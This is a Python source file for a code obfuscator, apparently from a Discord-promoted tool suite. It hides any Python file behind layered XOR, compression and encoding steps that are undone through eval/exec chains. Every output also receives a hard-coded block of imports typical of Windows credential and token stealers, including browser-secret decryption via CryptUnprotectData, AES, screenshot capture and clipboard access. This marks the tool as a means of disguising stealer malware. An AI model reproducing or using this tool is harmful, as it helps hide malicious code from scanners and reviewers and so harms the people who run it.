from Helper import *
from Helper.Common.utils import *


class Obfuscator:
    def __init__(self, code):
        self.code = code
        self.__obfuscate()
    
    def __xorED(self, text, key = None):
        newstring = ""
        if key is None:
            key = "".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))
        if not key[0] == " ":
            key = " " + key
        for i in range(len(text)):
            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))
        return (newstring, key)

    def __encodestring(self, string):
        newstring = ''
        for i in string:
            if random.choice([True, False]):
                newstring += '\\x' + codecs.encode(i.encode(), 'hex').decode()
            else:
                newstring += '\\' + oct(ord(i))[2:]
        return newstring

    def __obfuscate(self):
        xorcod = self.__xorED(self.code)
        self.code = xorcod[0]
        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()
        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]
        new_encoded_code = []
        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')
        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')
        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')
        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')
        self.code = f"""
_0x711=eval("{self.__encodestring('eval')}");_0x711__=_0x711("{self.__encodestring('compile')}");_0x711_,____=_0x711(_0x711__("{self.__encodestring("__import__('base64')")}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring("__import__('codecs')")}","",_0x711.__name__));_0x711_0x711_0x711_0x711=_0x711("'{self.__encodestring(xorcod[True])}'");_0x711___,_0x711____,_0x711_0x711,_0x711_0x711_=_0x711(_0x711__("{self.__encodestring('exec')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('str.encode')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('isinstance')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('bytes')}","",_0x711.__name__))
def _0x711_0x711_0x711____(_0x711_0x711, _0x711_0x711_):
    _0x711_0x711=_0x711_0x711.decode()
    _0x711____=""
    if not _0x711_0x711_[False]=="{self.__encodestring(' ')}":
        _0x711_0x711_="{self.__encodestring(' ')}"+_0x711_0x711_
    for _ in range(_0x711("{self.__encodestring('len(_0x711_0x711)')}")):
        _0x711____+=_0x711("{self.__encodestring('chr(ord(_0x711_0x711[_])^ord(_0x711_0x711_[(len(_0x711_0x711_) - True*2) + True]))')}")
    return (_0x711____,_0x711_0x711_)
def _0x711_0x711__(_0x711_0x711___):
    if(_0x711_0x711___[-True]!=_0x711(_0x711__("'{self.__encodestring('c_0x711_0x711_0x711_6s5_0x711_0x711_0x711_6ardv8')}'[-True*4]","",_0x711.__name__))):_0x711_0x711___ = _0x711____(_0x711_0x711___)
    if not(_0x711_0x711(_0x711_0x711___, _0x711_0x711_)):_0x711_0x711___ = _0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('rot13')}')","",_0x711.__name__))
    else:
        if(_0x711_0x711___[-True]==_0x711(_0x711__("b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]","", _0x711.__name__))):
            _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('uu')}')","",_0x711.__name__))
        elif (_0x711_0x711___[-True] ==_0x711(_0x711__("b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]","", _0x711.__name__))):_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('hex')}')","",_0x711.__name__))
        else:_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_.b85decode(_0x711_0x711___[:-True])')}","",_0x711.__name__));_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___')}, '{self.__encodestring('hex')}')","",_0x711.__name__))
        _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode(_0x711_0x711___)')}","",_0x711.__name__))
    return _0x711_0x711___
_0x711_0x711_0x711__=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})","",_0x711.__name__));_0x711_0x711_0x711_ = _0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})","",_0x711.__name__));_0x711_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})","",_0x711.__name__));_0x711_0x711____=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[False]).encode()})","",_0x711.__name__));_0x711_0x711_0x711=_0x711(_0x711__("{self.__encodestring('str.join')}('', {self.__encodestring('[_0x711_0x711__(x) for x in [_0x711_0x711____,_0x711_0x711_0x711_,_0x711_0x711_0x711___,_0x711_0x711_0x711__]]')})","", _0x711.__name__));_0x711___(_0x711_0x711_0x711____(____.decode(____.decode(_0x711_.b64decode(_0x711____(_0x711_0x711_0x711)), "{self.__encodestring("uu")}"),"{self.__encodestring("bz2")}"),_0x711_0x711_0x711_0x711)[_0x711("{self.__encodestring('False')}")])\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip,base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"""

def obfuscate():
    new_title("obfusicator discord.gg/nexustools")
    File = input(f"{Fore.RESET}[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Enter Py File Path(Drag & Drop): ")
    if not os.path.isfile(File):
        print(f'File "{os.path.basename(File)}" is not found')
        exit()
    elif not 'py' in os.path.basename(File).split('.')[-1]:
        print(f'''File "{os.path.basename(File)}" is not a '.py' file''')
        exit()
    with open(File, encoding='utf-8') as file:
        CODE = file.read()
    obfuscator = Obfuscator(CODE)
    
    filename = os.path.splitext(os.path.basename(File))[0]
    
    with open(f"Output/Obf/Obfuscated_{filename}.py", 'w', encoding='utf-8') as output_file:
        output_file.write(obfuscator.code)
    print(f'{lc} Code obfuscated!{Fore.RESET}')
    input("Press Enter To continue...")

